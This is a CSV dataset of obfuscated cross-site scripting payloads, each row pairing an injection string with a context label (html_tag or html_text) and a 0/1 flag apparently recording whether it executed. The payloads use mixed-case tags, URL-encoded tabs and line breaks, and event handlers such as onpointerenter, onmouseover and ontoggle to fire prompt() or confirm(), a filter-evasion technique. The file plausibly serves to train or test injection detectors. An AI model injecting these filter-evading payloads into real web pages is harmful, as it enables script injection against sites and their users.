payload,context,exec,combined
"<d3V%0doNPOInTerEnter%0a=%0aa=prompt,a()%0dx>v3dm0s",html_tag,1,"CONTEXT_html_tag <d3V%0doNPOInTerEnter%0a=%0aa=prompt,a()%0dx>v3dm0s"
"<dEtAIls/+/ONPoINTEreNTER+=+a=prompt,a()%0dx>",html_tag,0,"CONTEXT_html_tag <dEtAIls/+/ONPoINTEreNTER+=+a=prompt,a()%0dx>"
<htmL%0donPOinteRENter%0a=%0a(prompt)``>,html_tag,0,CONTEXT_html_tag <htmL%0donPOinteRENter%0a=%0a(prompt)``>
"<detAIls%0doNpOinTErEnteR%0a=%0aa=prompt,a()>",html_text,0,"CONTEXT_html_text <detAIls%0doNpOinTErEnteR%0a=%0aa=prompt,a()>"
<hTmL%09ONPOINTeREnTER%0a=%0a[8].find(confirm)%0dx//,html_text,0,CONTEXT_html_text <hTmL%09ONPOINTeREnTER%0a=%0a[8].find(confirm)%0dx//
<D3V%0dOnMoUsEoveR%09=%09confirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3V%0dOnMoUsEoveR%09=%09confirm()%0dx>v3dm0s
<HTML/+/OnMOuseOvEr+=+(confirm)()%0dx>,html_tag,0,CONTEXT_html_tag <HTML/+/OnMOuseOvEr+=+(confirm)()%0dx>
<D3v%09OnPoINTErEntEr%09=%09confirm()>v3dm0s,html_text,1,CONTEXT_html_text <D3v%09OnPoINTErEntEr%09=%09confirm()>v3dm0s
<DeTAiLS%0aONPoiNTErentER%0a=%0a[8].find(confirm)>,html_tag,0,CONTEXT_html_tag <DeTAiLS%0aONPoiNTErentER%0a=%0a[8].find(confirm)>
<A%0dOnpOInteRENter%0a=%0a(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <A%0dOnpOInteRENter%0a=%0a(confirm)()>v3dm0s
<d3v%09onpoiNTErENTEr%0a=%0aconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3v%09onpoiNTErENTEr%0a=%0aconfirm()%0dx>v3dm0s
<A%0dOnmoUsEOver+=+(prompt)``%0dx>v3dm0s,html_tag,0,CONTEXT_html_tag <A%0dOnmoUsEOver+=+(prompt)``%0dx>v3dm0s
<DETaIlS%0aOnToggLe%09=%09[8].find(confirm)%0dx//,html_text,0,CONTEXT_html_text <DETaIlS%0aOnToggLe%09=%09[8].find(confirm)%0dx//
"<a/+/ONpoINteRENtEr%0a=%0aa=prompt,a()>v3dm0s",html_tag,1,"CONTEXT_html_tag <a/+/ONpoINteRENtEr%0a=%0aa=prompt,a()>v3dm0s"
"<A%0donmOuseovEr%0d=%0da=prompt,a()>v3dm0s",html_tag,1,"CONTEXT_html_tag <A%0donmOuseovEr%0d=%0da=prompt,a()>v3dm0s"
<d3V%09ONpoiNTErENtEr%0d=%0d[8].find(confirm)>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V%09ONpoiNTErENtEr%0d=%0d[8].find(confirm)>v3dm0s
<A%0donmOUsEOveR%0d=%0dconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <A%0donmOUsEOveR%0d=%0dconfirm()>v3dm0s
<a/+/ONpOINtERENtER%0d=%0d(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <a/+/ONpOINtERENtER%0d=%0d(confirm)()>v3dm0s
<A/+/OnMouSEOVeR+=+[8].find(confirm)>v3dm0s,html_tag,0,CONTEXT_html_tag <A/+/OnMouSEOVeR+=+[8].find(confirm)>v3dm0s
<htmL%0donPOinteRENter%0a=%0a(prompt)``>,html_text,0,CONTEXT_html_text <htmL%0donPOinteRENter%0a=%0a(prompt)``>
<a%09ONPoiNTErEnTEr%09=%09confirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <a%09ONPoiNTErEnTEr%09=%09confirm()%0dx>v3dm0s
"<d3V%09oNpoiNTerENTER%09=%09a=prompt,a()>v3dm0s",html_tag,1,"CONTEXT_html_tag <d3V%09oNpoiNTerENTER%09=%09a=prompt,a()>v3dm0s"
<A%09OnpOInTeRENtER%0d=%0d(prompt)``>v3dm0s,html_tag,1,CONTEXT_html_tag <A%09OnpOInTeRENtER%0d=%0d(prompt)``>v3dm0s
<a%0dONmOuSEoVeR%09=%09confirm()>v3dm0s,html_text,1,CONTEXT_html_text <a%0dONmOuSEoVeR%09=%09confirm()>v3dm0s
<deTAIls%0aONtOggLe%0a=%0a[8].find(confirm)//,html_text,0,CONTEXT_html_text <deTAIls%0aONtOggLe%0a=%0a[8].find(confirm)//
<html/+/ONPOinterEnTER+=+(prompt)``//,html_tag,0,CONTEXT_html_tag <html/+/ONPOinterEnTER+=+(prompt)``//
<D3V/+/onMoUSEOVER%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V/+/onMoUSEOVER%0d=%0dconfirm()%0dx>v3dm0s
<Details/+/onPOINTeRenTeR%09=%09confirm()//,html_tag,0,CONTEXT_html_tag <Details/+/onPOINTeRenTeR%09=%09confirm()//
<d3V%0donPoInTErEnter%0d=%0d(confirm)()>v3dm0s,html_text,1,CONTEXT_html_text <d3V%0donPoInTErEnter%0d=%0d(confirm)()>v3dm0s
<HtML/+/onMouseovEr%0d=%0dconfirm()%0dx//,html_tag,0,CONTEXT_html_tag <HtML/+/onMouseovEr%0d=%0dconfirm()%0dx//
<HTml/+/onPoiNTERentER%09=%09(prompt)``%0dx>,html_tag,0,CONTEXT_html_tag <HTml/+/onPoiNTERentER%09=%09(prompt)``%0dx>
"<D3v%09oNPOinTEREnTER%0d=%0da=prompt,a()>v3dm0s",html_text,1,"CONTEXT_html_text <D3v%09oNPOinTEREnTER%0d=%0da=prompt,a()>v3dm0s"
<d3v/+/OnpOINTerenTER%0d=%0d(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <d3v/+/OnpOINTerenTER%0d=%0d(confirm)()>v3dm0s
<d3V%09ONMOUSeover%09=%09[8].find(confirm)>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V%09ONMOUSeover%09=%09[8].find(confirm)>v3dm0s
<hTMl%0aoNPOiNterENTEr%09=%09(prompt)``>,html_tag,0,CONTEXT_html_tag <hTMl%0aoNPOiNterENTEr%09=%09(prompt)``>
<deTaILs%0dONToGgLe%0a=%0aconfirm()//,html_text,0,CONTEXT_html_text <deTaILs%0dONToGgLe%0a=%0aconfirm()//
<A%09OnMouSEOVER%09=%09confirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <A%09OnMouSEOVER%09=%09confirm()>v3dm0s
<Details%0aOnPOInTErEnteR%0d=%0d(prompt)``%0dx//,html_tag,0,CONTEXT_html_tag <Details%0aOnPOInTErEnteR%0d=%0d(prompt)``%0dx//
<D3V%0aOnmoUSeOVEr%09=%09(confirm)()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3V%0aOnmoUSeOVEr%09=%09(confirm)()%0dx>v3dm0s
<HTML/+/OnpOINTerenter%0d=%0d[8].find(confirm)//,html_text,0,CONTEXT_html_text <HTML/+/OnpOINTerenter%0d=%0d[8].find(confirm)//
<htMl%0dOnMoUSEOvEr%0a=%0a(prompt)``%0dx//,html_text,0,CONTEXT_html_text <htMl%0dOnMoUSEOvEr%0a=%0a(prompt)``%0dx//
"<D3V/+/onMOusEovER%0a=%0aa=prompt,a()%0dx>v3dm0s",html_tag,1,"CONTEXT_html_tag <D3V/+/onMOusEovER%0a=%0aa=prompt,a()%0dx>v3dm0s"
<a%0aONpOinTEreNTer+=+(prompt)``%0dx>v3dm0s,html_text,0,CONTEXT_html_text <a%0aONpOinTEreNTer+=+(prompt)``%0dx>v3dm0s
"<A%09OnMoUSeOVEr%09=%09a=prompt,a()>v3dm0s",html_text,1,"CONTEXT_html_text <A%09OnMoUSeOVEr%09=%09a=prompt,a()>v3dm0s"
<A%0aoNPoiNTEReNTER%0d=%0d(prompt)``%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A%0aoNPoiNTEReNTER%0d=%0d(prompt)``%0dx>v3dm0s
<DETaILs/+/ONtoGGLE%09=%09(prompt)``%0dx>,html_text,0,CONTEXT_html_text <DETaILs/+/ONtoGGLE%09=%09(prompt)``%0dx>
<HTMl%0dOnmoUsEover%0a=%0aconfirm()%0dx//,html_text,0,CONTEXT_html_text <HTMl%0dOnmoUsEover%0a=%0aconfirm()%0dx//
<D3v%09onMOUSEoVer+=+confirm()>v3dm0s,html_tag,0,CONTEXT_html_tag <D3v%09onMOUSEoVer+=+confirm()>v3dm0s
<a/+/oNPOINtEReNtEr%0d=%0d(confirm)()>v3dm0s,html_text,1,CONTEXT_html_text <a/+/oNPOINtEReNtEr%0d=%0d(confirm)()>v3dm0s
<deTAils%09oNPOInTEREnTeR+=+(confirm)()>,html_tag,0,CONTEXT_html_tag <deTAils%09oNPOInTEREnTeR+=+(confirm)()>
<D3V%09oNpoINteREnter%0a=%0aconfirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V%09oNpoINteREnter%0a=%0aconfirm()>v3dm0s
<A%0dOnmoUsEOver+=+(prompt)``%0dx>v3dm0s,html_text,0,CONTEXT_html_text <A%0dOnmoUsEOver+=+(prompt)``%0dx>v3dm0s
<HtmL%0aonmOUSEover+=+confirm()>,html_tag,0,CONTEXT_html_tag <HtmL%0aonmOUSEover+=+confirm()>
"<deTailS/+/OntoGGLE%0d=%0da=prompt,a()//",html_tag,0,"CONTEXT_html_tag <deTailS/+/OntoGGLE%0d=%0da=prompt,a()//"
<d3V%0dOnpoIntErEntEr%09=%09(confirm)()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V%0dOnpoIntErEntEr%09=%09(confirm)()%0dx>v3dm0s
<DEtAIls%09OntoGGlE%0a=%0aconfirm()>,html_tag,0,CONTEXT_html_tag <DEtAIls%09OntoGGlE%0a=%0aconfirm()>
<d3v/+/ONMousEOver%09=%09confirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3v/+/ONMousEOver%09=%09confirm()%0dx>v3dm0s
<Details%0aOnPOInTErEnteR%0d=%0d(prompt)``%0dx//,html_text,0,CONTEXT_html_text <Details%0aOnPOInTErEnteR%0d=%0d(prompt)``%0dx//
"<a%09onpoinTeReNTer%09=%09a=prompt,a()%0dx>v3dm0s",html_text,1,"CONTEXT_html_text <a%09onpoinTeReNTer%09=%09a=prompt,a()%0dx>v3dm0s"
<dETAilS/+/oNtogGLE%09=%09[8].find(confirm)%0dx>,html_text,0,CONTEXT_html_text <dETAilS/+/oNtogGLE%09=%09[8].find(confirm)%0dx>
<HTml/+/OnmousEoVeR+=+confirm()//,html_tag,0,CONTEXT_html_tag <HTml/+/OnmousEoVeR+=+confirm()//
<a/+/ONpOINtERENtER%0d=%0d(confirm)()>v3dm0s,html_text,1,CONTEXT_html_text <a/+/ONpOINtERENtER%0d=%0d(confirm)()>v3dm0s
<A/+/oNMOUSEOVer%09=%09[8].find(confirm)>v3dm0s,html_tag,1,CONTEXT_html_tag <A/+/oNMOUSEOVer%09=%09[8].find(confirm)>v3dm0s
<deTAiLS%0doNTOGGLe%0d=%0d(confirm)()%0dx//,html_tag,0,CONTEXT_html_tag <deTAiLS%0doNTOGGLe%0d=%0d(confirm)()%0dx//
<dETaiLs/+/OnpoInTeRenTEr%09=%09(prompt)``%0dx>,html_text,0,CONTEXT_html_text <dETaiLs/+/OnpoInTeRenTEr%09=%09(prompt)``%0dx>
<A/+/oNMOUSEOVer%09=%09[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <A/+/oNMOUSEOVer%09=%09[8].find(confirm)>v3dm0s
<a%0aONpoIntERenteR%0d=%0d(confirm)()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0aONpoIntERenteR%0d=%0d(confirm)()%0dx>v3dm0s
<deTAILS/+/oNpOInTErENter+=+confirm()%0dx>,html_text,0,CONTEXT_html_text <deTAILS/+/oNpOInTErENter+=+confirm()%0dx>
<a/+/oNPoINtERENteR%09=%09[8].find(confirm)>v3dm0s,html_tag,1,CONTEXT_html_tag <a/+/oNPoINtERENteR%09=%09[8].find(confirm)>v3dm0s
<DETails%0donPOiNTerEntEr%0a=%0a(confirm)()%0dx>,html_tag,0,CONTEXT_html_tag <DETails%0donPOiNTerEntEr%0a=%0a(confirm)()%0dx>
<dETAIlS/+/ONtoggLE%0a=%0aconfirm()%0dx//,html_tag,0,CONTEXT_html_tag <dETAIlS/+/ONtoggLE%0a=%0aconfirm()%0dx//
<d3v/+/OnpOintErENTEr%0a=%0aconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3v/+/OnpOintErENTEr%0a=%0aconfirm()%0dx>v3dm0s
<A%0aONPoINTerEntEr+=+(confirm)()%0dx>v3dm0s,html_text,0,CONTEXT_html_text <A%0aONPoINTerEntEr+=+(confirm)()%0dx>v3dm0s
<d3v%0doNPoinTeRentER%0a=%0a(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3v%0doNPoinTeRentER%0a=%0a(prompt)``%0dx>v3dm0s
"<deTailS%09oNTogGLe%0d=%0da=prompt,a()%0dx//",html_text,0,"CONTEXT_html_text <deTailS%09oNTogGLe%0d=%0da=prompt,a()%0dx//"
<a%0doNmOusEoVEr%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_text,1,CONTEXT_html_text <a%0doNmOusEoVEr%0d=%0d[8].find(confirm)%0dx>v3dm0s
"<D3v%0aonMoUSeoveR%09=%09a=prompt,a()>v3dm0s",html_text,1,"CONTEXT_html_text <D3v%0aonMoUSeoveR%09=%09a=prompt,a()>v3dm0s"
<DetAIlS/+/onPOINTereNter%09=%09[8].find(confirm)%0dx//,html_text,0,CONTEXT_html_text <DetAIlS/+/onPOINTereNter%09=%09[8].find(confirm)%0dx//
<HtmL%0aOnMOuSEOVER%09=%09confirm()//,html_tag,0,CONTEXT_html_tag <HtmL%0aOnMOuSEOVER%09=%09confirm()//
<HtmL/+/oNMOuSeovEr+=+confirm()%0dx>,html_text,0,CONTEXT_html_text <HtmL/+/oNMOuSeovEr+=+confirm()%0dx>
<DEtAIlS%0aONtoggle%0d=%0dconfirm()%0dx>,html_tag,0,CONTEXT_html_tag <DEtAIlS%0aONtoggle%0d=%0dconfirm()%0dx>
"<d3V%09onmOUsEOveR+=+a=prompt,a()>v3dm0s",html_text,0,"CONTEXT_html_text <d3V%09onmOUsEOveR+=+a=prompt,a()>v3dm0s"
"<DETAiLS%0aontoggLE+=+a=prompt,a()>",html_tag,0,"CONTEXT_html_tag <DETAiLS%0aontoggLE+=+a=prompt,a()>"
<d3V/+/OnMOusEoVeR+=+[8].find(confirm)>v3dm0s,html_tag,0,CONTEXT_html_tag <d3V/+/OnMOusEoVeR+=+[8].find(confirm)>v3dm0s
<d3v%0aoNmOUSEover%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3v%0aoNmOUSEover%0d=%0dconfirm()%0dx>v3dm0s
<A%09OnPoinTEREntER%09=%09confirm()>v3dm0s,html_text,1,CONTEXT_html_text <A%09OnPoinTEREntER%09=%09confirm()>v3dm0s
"<HtMl%09oNPoINteREntEr%0d=%0da=prompt,a()>",html_text,0,"CONTEXT_html_text <HtMl%09oNPoINteREntEr%0d=%0da=prompt,a()>"
<DEtaiLs%0aONTOGglE+=+confirm()>,html_tag,0,CONTEXT_html_tag <DEtaiLs%0aONTOGglE+=+confirm()>
<a%0dOnPOiNTeREnTER%0a=%0a[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <a%0dOnPOiNTeREnTER%0a=%0a[8].find(confirm)>v3dm0s
<A%0aONMoUsEover%0a=%0aconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A%0aONMoUsEover%0a=%0aconfirm()%0dx>v3dm0s
<DEtAIlS/+/ONPOinTereNteR%09=%09(prompt)``%0dx//,html_text,0,CONTEXT_html_text <DEtAIlS/+/ONPOinTereNteR%09=%09(prompt)``%0dx//
<D3V/+/onMOUSEOvER%09=%09(confirm)()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V/+/onMOUSEOvER%09=%09(confirm)()%0dx>v3dm0s
<a%0dOnPOintErEnTeR%0a=%0a(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0dOnPOintErEnTeR%0a=%0a(prompt)``%0dx>v3dm0s
<A%0aoNMoUSEOvEr%09=%09(prompt)``%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A%0aoNMoUSEOvEr%09=%09(prompt)``%0dx>v3dm0s
<DETAilS%09ONtoggle%0d=%0dconfirm()%0dx>,html_text,0,CONTEXT_html_text <DETAilS%09ONtoggle%0d=%0dconfirm()%0dx>
"<dEtAIls/+/ONPoINTEreNTER+=+a=prompt,a()%0dx>",html_text,0,"CONTEXT_html_text <dEtAIls/+/ONPoINTEreNTER+=+a=prompt,a()%0dx>"
"<a%09OnMouSEoveR%09=%09a=prompt,a()%0dx>v3dm0s",html_text,1,"CONTEXT_html_text <a%09OnMouSEoveR%09=%09a=prompt,a()%0dx>v3dm0s"
"<a%09OnMouSEoveR%09=%09a=prompt,a()%0dx>v3dm0s",html_tag,1,"CONTEXT_html_tag <a%09OnMouSEoveR%09=%09a=prompt,a()%0dx>v3dm0s"
<DETAiLS%0aOnPOInteRenTER%09=%09confirm()>,html_text,0,CONTEXT_html_text <DETAiLS%0aOnPOInteRenTER%09=%09confirm()>
<HtML%09onPoiNterEnTer+=+confirm()%0dx>,html_tag,0,CONTEXT_html_tag <HtML%09onPoiNterEnTer+=+confirm()%0dx>
<A/+/ONPOintErenteR%0d=%0d(prompt)``>v3dm0s,html_tag,1,CONTEXT_html_tag <A/+/ONPOintErenteR%0d=%0d(prompt)``>v3dm0s
<dEtAIlS%0aoNPOiNTEREnTEr+=+(confirm)()%0dx>,html_text,0,CONTEXT_html_text <dEtAIlS%0aoNPOiNTEREnTEr+=+(confirm)()%0dx>
<detAIlS%0aOnPoiNtEreNTer%0a=%0aconfirm()%0dx>,html_text,0,CONTEXT_html_text <detAIlS%0aOnPoiNtEreNTer%0a=%0aconfirm()%0dx>
<HTML%09oNMoUsEOveR+=+(confirm)()//,html_tag,0,CONTEXT_html_tag <HTML%09oNMoUsEOveR+=+(confirm)()//
<A%0dONmouseoveR%0a=%0a(confirm)()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A%0dONmouseoveR%0a=%0a(confirm)()%0dx>v3dm0s
<D3v/+/ONPoinTeRENTER%0a=%0a(prompt)``>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v/+/ONPoinTeRENTER%0a=%0a(prompt)``>v3dm0s
<deTAILS/+/onTOGGle%0a=%0a[8].find(confirm)%0dx>,html_text,0,CONTEXT_html_text <deTAILS/+/onTOGGle%0a=%0a[8].find(confirm)%0dx>
<D3v/+/ONMOUseoveR%09=%09(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v/+/ONMOUseoveR%09=%09(prompt)``%0dx>v3dm0s
<DeTAils/+/OntoGGLe%09=%09(confirm)()%0dx//,html_text,0,CONTEXT_html_text <DeTAils/+/OntoGGLe%09=%09(confirm)()%0dx//
<A%0aONmoUSEOVER%09=%09(confirm)()>v3dm0s,html_text,1,CONTEXT_html_text <A%0aONmoUSEOVER%09=%09(confirm)()>v3dm0s
<d3v%0doNpoIntErEntEr+=+[8].find(confirm)>v3dm0s,html_text,0,CONTEXT_html_text <d3v%0doNpoIntErEntEr+=+[8].find(confirm)>v3dm0s
<D3v%0aoNmOUsEOver%0a=%0aconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3v%0aoNmOUsEOver%0a=%0aconfirm()%0dx>v3dm0s
<hTML%0aONmOUseoVeR%09=%09confirm()%0dx>,html_tag,0,CONTEXT_html_tag <hTML%0aONmOUseoVeR%09=%09confirm()%0dx>
"<D3v%09oNPOinTEREnTER%0d=%0da=prompt,a()>v3dm0s",html_tag,1,"CONTEXT_html_tag <D3v%09oNPOinTEREnTER%0d=%0da=prompt,a()>v3dm0s"
<A/+/OnMouSEOVeR+=+[8].find(confirm)>v3dm0s,html_text,0,CONTEXT_html_text <A/+/OnMouSEOVeR+=+[8].find(confirm)>v3dm0s
"<a%0aONpOIntEreNteR%0d=%0da=prompt,a()>v3dm0s",html_text,1,"CONTEXT_html_text <a%0aONpOIntEreNteR%0d=%0da=prompt,a()>v3dm0s"
<d3V/+/onPoiNtEReNtEr%0a=%0aconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <d3V/+/onPoiNtEReNtEr%0a=%0aconfirm()>v3dm0s
<HtmL/+/ONMoUseOVer%09=%09confirm()%0dx>,html_tag,0,CONTEXT_html_tag <HtmL/+/ONMoUseOVer%09=%09confirm()%0dx>
<D3v%09OnpOiNTerEnTer%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%09OnpOiNTerEnTer%0d=%0d[8].find(confirm)%0dx>v3dm0s
<detailS/+/ontOggle%09=%09[8].find(confirm)//,html_tag,0,CONTEXT_html_tag <detailS/+/ontOggle%09=%09[8].find(confirm)//
<a/+/ONMOuseoVEr%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a/+/ONMOuseoVEr%0d=%0dconfirm()%0dx>v3dm0s
<d3V/+/oNmoUseOVeR%09=%09[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <d3V/+/oNmoUseOVeR%09=%09[8].find(confirm)>v3dm0s
<a%0dOnPOintErEnTeR%0a=%0a(prompt)``%0dx>v3dm0s,html_text,1,CONTEXT_html_text <a%0dOnPOintErEnTeR%0a=%0a(prompt)``%0dx>v3dm0s
<D3V%0aoNmoUSEOveR%09=%09[8].find(confirm)%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3V%0aoNmoUSEOveR%09=%09[8].find(confirm)%0dx>v3dm0s
<A%09ONmouSEoVEr%09=%09confirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A%09ONmouSEoVEr%09=%09confirm()%0dx>v3dm0s
<hTMl/+/oNmOUSeoVER%0a=%0aconfirm()>,html_text,0,CONTEXT_html_text <hTMl/+/oNmOUSeoVER%0a=%0aconfirm()>
<d3v%09oNpoiNtereNTeR+=+(prompt)``%0dx>v3dm0s,html_text,0,CONTEXT_html_text <d3v%09oNpoiNtereNTeR+=+(prompt)``%0dx>v3dm0s
<A%09onpointEREnTer%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A%09onpointEREnTer%0d=%0dconfirm()%0dx>v3dm0s
"<d3V%0doNPOInTerEnter%0a=%0aa=prompt,a()%0dx>v3dm0s",html_text,1,"CONTEXT_html_text <d3V%0doNPOInTerEnter%0a=%0aa=prompt,a()%0dx>v3dm0s"
<hTmL%09oNPoiNtereNteR%09=%09confirm()>,html_tag,0,CONTEXT_html_tag <hTmL%09oNPoiNtereNteR%09=%09confirm()>
<d3V%09oNpOiNTEREntER%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3V%09oNpOiNTEREntER%0d=%0dconfirm()%0dx>v3dm0s
<HtmL%09ONpOInTeREnTeR%0a=%0a(confirm)()>,html_tag,0,CONTEXT_html_tag <HtmL%09ONpOInTeREnTeR%0a=%0a(confirm)()>
"<d3V%09oNpoiNTerENTER%09=%09a=prompt,a()>v3dm0s",html_text,1,"CONTEXT_html_text <d3V%09oNpoiNTerENTER%09=%09a=prompt,a()>v3dm0s"
<D3v%09onPoiNtereNtEr%0a=%0aconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <D3v%09onPoiNtereNtEr%0a=%0aconfirm()>v3dm0s
<A/+/ONPOintErenteR%0d=%0d(prompt)``>v3dm0s,html_text,1,CONTEXT_html_text <A/+/ONPOintErenteR%0d=%0d(prompt)``>v3dm0s
<HtmL/+/oNmousEoVER%0a=%0a[8].find(confirm)>,html_tag,0,CONTEXT_html_tag <HtmL/+/oNmousEoVER%0a=%0a[8].find(confirm)>
<d3V%0dOnmOUSEOVEr%0d=%0d[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <d3V%0dOnmOUSEOVEr%0d=%0d[8].find(confirm)>v3dm0s
<d3V%0aonpoINTeRENTER%0a=%0a(confirm)()>v3dm0s,html_text,1,CONTEXT_html_text <d3V%0aonpoINTeRENTER%0a=%0a(confirm)()>v3dm0s
<D3V%0aoNpoiNTERentER%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V%0aoNpoiNTERentER%0d=%0dconfirm()%0dx>v3dm0s
<D3V/+/onPointerEnteR%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V/+/onPointerEnteR%0d=%0dconfirm()%0dx>v3dm0s
<D3v/+/ONPoinTeRENTER%0a=%0a(prompt)``>v3dm0s,html_text,1,CONTEXT_html_text <D3v/+/ONPoinTeRENTER%0a=%0a(prompt)``>v3dm0s
<A%0dONpoInTerEnTer+=+confirm()>v3dm0s,html_text,0,CONTEXT_html_text <A%0dONpoInTerEnTer+=+confirm()>v3dm0s
<D3V%09OnPOiNtEReNTER%0d=%0d(prompt)``>v3dm0s,html_text,1,CONTEXT_html_text <D3V%09OnPOiNtEReNTER%0d=%0d(prompt)``>v3dm0s
<d3V/+/onMOusEover%0d=%0d(prompt)``%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3V/+/onMOusEover%0d=%0d(prompt)``%0dx>v3dm0s
<a%0doNpoinTERenteR%0d=%0dconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <a%0doNpoinTERenteR%0d=%0dconfirm()>v3dm0s
<d3V/+/onpOiNTeRENTer%0a=%0aconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3V/+/onpOiNTeRENTer%0a=%0aconfirm()%0dx>v3dm0s
